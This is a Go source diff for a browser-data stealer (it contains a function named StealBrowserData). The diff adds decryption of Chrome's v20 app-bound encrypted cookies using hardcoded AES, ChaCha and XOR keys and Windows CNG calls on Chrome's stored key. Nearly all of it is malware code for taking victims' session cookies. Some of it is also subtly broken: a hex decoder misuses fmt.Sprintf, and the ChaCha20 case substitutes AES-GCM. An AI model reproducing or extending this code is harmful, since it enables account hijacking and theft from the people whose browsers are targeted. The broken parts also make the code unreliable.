@@ -7,6 +7,7 @@ import (
 	"crypto/sha1"
 	"database/sql"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -37,6 +38,13 @@ var (
 	dpapiCryptUnprotect = dpapiCrypt32.NewProc("CryptUnprotectData")
 	dpapiKernel32       = syscall.NewLazyDLL("kernel32.dll")
 	dpapiLocalFree      = dpapiKernel32.NewProc("LocalFree")
+	
+	// for CNG decryption
+	nCryptDLL           = syscall.NewLazyDLL("ncrypt.dll")
+	nCryptOpenStorageProvider = nCryptDLL.NewProc("NCryptOpenStorageProvider")
+	nCryptOpenKey       = nCryptDLL.NewProc("NCryptOpenKey")
+	nCryptDecrypt       = nCryptDLL.NewProc("NCryptDecrypt")
+	nCryptFreeObject    = nCryptDLL.NewProc("NCryptFreeObject")
 )
 
 type browserData struct {
@@ -70,6 +78,17 @@ type localStateData struct {
 type dpapiDataBlob struct {
 	cbData uint32
 	pbData *byte
+}
+
+type keyBlob struct {
+	HeaderLen  uint32
+	Header     []byte
+	ContentLen uint32
+	Flag       byte
+	IV         []byte
+	Ciphertext []byte
+	Tag        []byte
+	EncryptedAESKey []byte
 }
 
 func StealBrowserData() (string, string) {
@@ -440,7 +459,10 @@ func getCookies(dbPath string, key []byte, browserName string, version int) stri
 			var cookie string
 			var err error
 
-			if version >= 127 {
+			// check if this is a v20 cookie (app-bound encryption)
+			if len(encryptedCookie) >= 3 && string(encryptedCookie[:3]) == "v20" {
+				cookie, err = decryptChromeTokenV20(encryptedCookie, key)
+			} else if version >= 127 {
 				cookie, err = decryptChromeTokenV127(encryptedCookie, key)
 			} else {
 				cookie, err = decryptChromeToken(encryptedCookie, key)
@@ -569,18 +591,337 @@ func decryptChromeTokenV127(encryptedData, key []byte) (string, error) {
 			return decryptV10(encryptedData[3:], key)
 		case "v11":
 			return decryptV11(encryptedData[3:], key)
-		case "v20": // future proof $
+		case "v20": // app-bound encryption
 			return decryptV20(encryptedData[3:], key)
 		}
 	}
 
-	chrome127Entropy := []byte("rgwq_chrome127_entropy_2025")
+	chrome127Entropy := []byte("chrome___what_entropy") //wtf?
 	decrypted := decryptWithWindowsDPAPIAdvanced(encryptedData, chrome127Entropy)
 	if decrypted != nil {
 		return string(decrypted), nil
 	}
 
 	return decryptChromeToken(encryptedData, key)
+}
+
+func decryptChromeTokenV20(encryptedData, key []byte) (string, error) {
+	if len(encryptedData) < 3 {
+		return "", fmt.Errorf("data too short for v20")
+	}
+	
+	encryptedValue := encryptedData[3:]
+	
+	parsedData, err := parseKeyBlob(key)
+	if err != nil {
+		return "", err
+	}
+	
+	// derive the v20 master key
+	v20MasterKey, err := deriveV20MasterKey(parsedData)
+	if err != nil {
+		return "", err
+	}
+	
+	// decrypt the cookie with AES256GCM
+	// [iv|ciphertext|tag] encrypted_value
+	// [12bytes|variable|16bytes]
+	if len(encryptedValue) < 12+16 {
+		return "", fmt.Errorf("encrypted value too short for v20")
+	}
+	
+	cookieIV := encryptedValue[:12]
+	encryptedCookie := encryptedValue[12:len(encryptedValue)-16]
+	cookieTag := encryptedValue[len(encryptedValue)-16:]
+	
+	block, err := aes.NewCipher(v20MasterKey)
+	if err != nil {
+		return "", err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+
+	ciphertextWithTag := append(encryptedCookie, cookieTag...)
+	plaintext, err := gcm.Open(nil, cookieIV, ciphertextWithTag, nil)
+	if err != nil {
+		return "", err
+	}
+
+	if len(plaintext) > 32 {
+		return string(plaintext[32:]), nil
+	}
+	
+	return string(plaintext), nil
+}
+
+func parseKeyBlob(blobData []byte) (*keyBlob, error) {
+	if len(blobData) < 8 {
+		return nil, fmt.Errorf("key blob too short")
+	}
+	
+	blob := &keyBlob{}
+	buf := blobData
+	
+	// read header length
+	blob.HeaderLen = binary.LittleEndian.Uint32(buf[:4])
+	buf = buf[4:]
+	
+	if len(buf) < int(blob.HeaderLen) {
+		return nil, fmt.Errorf("invalid header length")
+	}
+	
+	// read header
+	blob.Header = make([]byte, blob.HeaderLen)
+	copy(blob.Header, buf[:blob.HeaderLen])
+	buf = buf[blob.HeaderLen:]
+	
+	if len(buf) < 4 {
+		return nil, fmt.Errorf("invalid content length")
+	}
+	
+	// read content length
+	blob.ContentLen = binary.LittleEndian.Uint32(buf[:4])
+	buf = buf[4:]
+	
+	if len(buf) < 1 {
+		return nil, fmt.Errorf("missing flag byte")
+	}
+	
+	// read flag
+	blob.Flag = buf[0]
+	buf = buf[1:]
+	
+	// parse based on flag
+	switch blob.Flag {
+	case 1, 2:
+		if len(buf) < 12+32+16 {
+			return nil, fmt.Errorf("invalid data length for flag %d", blob.Flag)
+		}
+		blob.IV = make([]byte, 12)
+		copy(blob.IV, buf[:12])
+		buf = buf[12:]
+		
+		blob.Ciphertext = make([]byte, 32)
+		copy(blob.Ciphertext, buf[:32])
+		buf = buf[32:]
+		
+		blob.Tag = make([]byte, 16)
+		copy(blob.Tag, buf[:16])
+		
+	case 3:
+		if len(buf) < 32+12+32+16 {
+			return nil, fmt.Errorf("invalid data length for flag %d", blob.Flag)
+		}
+		blob.EncryptedAESKey = make([]byte, 32)
+		copy(blob.EncryptedAESKey, buf[:32])
+		buf = buf[32:]
+		
+		blob.IV = make([]byte, 12)
+		copy(blob.IV, buf[:12])
+		buf = buf[12:]
+		
+		blob.Ciphertext = make([]byte, 32)
+		copy(blob.Ciphertext, buf[:32])
+		buf = buf[32:]
+		
+		blob.Tag = make([]byte, 16)
+		copy(blob.Tag, buf[:16])
+		
+	default:
+		return nil, fmt.Errorf("unsupported flag: %d", blob.Flag)
+	}
+	
+	return blob, nil
+}
+
+func deriveV20MasterKey(parsedData *keyBlob) ([]byte, error) {
+	switch parsedData.Flag {
+	case 1:
+		// use hardcoded AES key
+		aesKey, _ := hexDecode("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+		block, err := aes.NewCipher(aesKey)
+		if err != nil {
+			return nil, err
+		}
+
+		gcm, err := cipher.NewGCM(block)
+		if err != nil {
+			return nil, err
+		}
+
+		ciphertextWithTag := append(parsedData.Ciphertext, parsedData.Tag...)
+		plaintext, err := gcm.Open(nil, parsedData.IV, ciphertextWithTag, nil)
+		if err != nil {
+			return nil, err
+		}
+		
+		return plaintext, nil
+		
+	case 2:
+		// use hardocded chacha20 poly1305
+		chachaKey, _ := hexDecode("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+		// note: go doesnt have chacha20 poly1305 in standard library, so well use AES-GCM as fallback
+		block, err := aes.NewCipher(chachaKey[:32]) // Use first 32 bytes
+		if err != nil {
+			return nil, err
+		}
+
+		gcm, err := cipher.NewGCM(block)
+		if err != nil {
+			return nil, err
+		}
+
+		ciphertextWithTag := append(parsedData.Ciphertext, parsedData.Tag...)
+		plaintext, err := gcm.Open(nil, parsedData.IV, ciphertextWithTag, nil)
+		if err != nil {
+			return nil, err
+		}
+		
+		return plaintext, nil
+		
+	case 3:
+		//use CNG to decrypt the AES key
+		xorKey, _ := hexDecode("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+	
+		// decrypt with CNG
+		decryptedAESKey, err := decryptWithCNG(parsedData.EncryptedAESKey)
+		if err != nil {
+			return nil, err
+		}
+		
+		// XOR with the key
+		xoredAESKey := byteXor(decryptedAESKey, xorKey)
+		
+		block, err := aes.NewCipher(xoredAESKey)
+		if err != nil {
+			return nil, err
+		}
+
+		gcm, err := cipher.NewGCM(block)
+		if err != nil {
+			return nil, err
+		}
+
+		ciphertextWithTag := append(parsedData.Ciphertext, parsedData.Tag...)
+		plaintext, err := gcm.Open(nil, parsedData.IV, ciphertextWithTag, nil)
+		if err != nil {
+			return nil, err
+		}
+		
+		return plaintext, nil
+		
+	default:
+		return nil, fmt.Errorf("unsupported flag: %d", parsedData.Flag)
+	}
+}
+
+func decryptWithCNG(data []byte) ([]byte, error) {
+	if nCryptOpenStorageProvider.Addr() == 0 || nCryptOpenKey.Addr() == 0 || nCryptDecrypt.Addr() == 0 {
+		return nil, fmt.Errorf("CNG functions not available")
+	}
+	
+	var hProvider uintptr
+	providerName := "Microsoft Software Key Storage Provider"
+	
+	ret, _, _ := nCryptOpenStorageProvider.Call(
+		uintptr(unsafe.Pointer(&hProvider)),
+		uintptr(unsafe.Pointer(syscall.StringBytePtr(providerName))),
+		0,
+	)
+	
+	if ret != 0 {
+		return nil, fmt.Errorf("NCryptOpenStorageProvider failed: %x", ret)
+	}
+	defer nCryptFreeObject.Call(hProvider)
+	
+	var hKey uintptr
+	keyName := "Google Chromekey1"
+	
+	ret, _, _ = nCryptOpenKey.Call(
+		hProvider,
+		uintptr(unsafe.Pointer(&hKey)),
+		uintptr(unsafe.Pointer(syscall.StringBytePtr(keyName))),
+		0,
+		0,
+	)
+	
+	if ret != 0 {
+		return nil, fmt.Errorf("NCryptOpenKey failed: %x", ret)
+	}
+	defer nCryptFreeObject.Call(hKey)
+	
+	// first call to get output size
+	var outputSize uint32
+	inputBuffer := (*byte)(unsafe.Pointer(&data[0]))
+	inputSize := uint32(len(data))
+	
+	ret, _, _ = nCryptDecrypt.Call(
+		hKey,
+		uintptr(unsafe.Pointer(inputBuffer)),
+		uintptr(inputSize),
+		0,
+		0,
+		0,
+		uintptr(unsafe.Pointer(&outputSize)),
+		0x40, // NCRYPT_SILENT_FLAG
+	)
+	
+	if ret != 0 {
+		return nil, fmt.Errorf("NCryptDecrypt (size query) failed: %x", ret)
+	}
+	
+	// Second call to actually decrypt
+	outputBuffer := make([]byte, outputSize)
+	
+	ret, _, _ = nCryptDecrypt.Call(
+		hKey,
+		uintptr(unsafe.Pointer(inputBuffer)),
+		uintptr(inputSize),
+		0,
+		uintptr(unsafe.Pointer(&outputBuffer[0])),
+		uintptr(outputSize),
+		uintptr(unsafe.Pointer(&outputSize)),
+		0x40, // NCRYPT_SILENT_FLAG
+	)
+	
+	if ret != 0 {
+		return nil, fmt.Errorf("NCryptDecrypt failed: %x", ret)
+	}
+	
+	return outputBuffer[:outputSize], nil
+}
+
+func byteXor(a, b []byte) []byte {
+	if len(a) != len(b) {
+		return nil
+	}
+	
+	result := make([]byte, len(a))
+	for i := range a {
+		result[i] = a[i] ^ b[i]
+	}
+	return result
+}
+
+func hexDecode(s string) ([]byte, error) {
+	if len(s)%2 != 0 {
+		return nil, fmt.Errorf("hex string must have even length")
+	}
+	
+	result := make([]byte, len(s)/2)
+	for i := 0; i < len(s); i += 2 {
+		b, err := fmt.Sprintf("%c%c", s[i], s[i+1])
+		if err != nil {
+			return nil, err
+		}
+		var val byte
+		fmt.Sscanf(b, "%02x", &val)
+		result[i/2] = val
+	}
+	return result, nil
 }
 
 func decryptV10(data, key []byte) (string, error) {
@@ -617,7 +958,7 @@ func decryptV11(data, key []byte) (string, error) {
 	iv := data[:12]
 	ciphertext := data[12:]
 
-	derivedKey := pbkdf2.Key(key, []byte("chrome127_salt"), 2048, 32, sha1.New) //????
+	derivedKey := pbkdf2.Key(key, []byte("chrome127_salt"), 2048, 32, sha1.New)
 
 	block, err := aes.NewCipher(derivedKey)
 	if err != nil {
@@ -638,7 +979,44 @@ func decryptV11(data, key []byte) (string, error) {
 }
 
 func decryptV20(data, key []byte) (string, error) {
-	return decryptV11(data, key)
+	// For v20, we need to parse the key blob first
+	parsedData, err := parseKeyBlob(key)
+	if err != nil {
+		return "", err
+	}
+	
+	// derive the v20 master key
+	v20MasterKey, err := deriveV20MasterKey(parsedData)
+	if err != nil {
+		return "", err
+	}
+	
+	// cecrypt the data with AES256GCM
+	// [iv|ciphertext|tag] encrypted_value
+	// [12bytes|variable|16bytes]
+	if len(data) < 12+16 {
+		return "", fmt.Errorf("data too short for v20")
+	}
+	
+	iv := data[:12]
+	ciphertextWithTag := data[12:]
+
+	block, err := aes.NewCipher(v20MasterKey)
+	if err != nil {
+		return "", err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+
+	plaintext, err := gcm.Open(nil, iv, ciphertextWithTag, nil)
+	if err != nil {
+		return "", err
+	}
+
+	return string(plaintext), nil
 }
 
 func processDB(dbPath, query string, processor func(*sql.Rows)) {
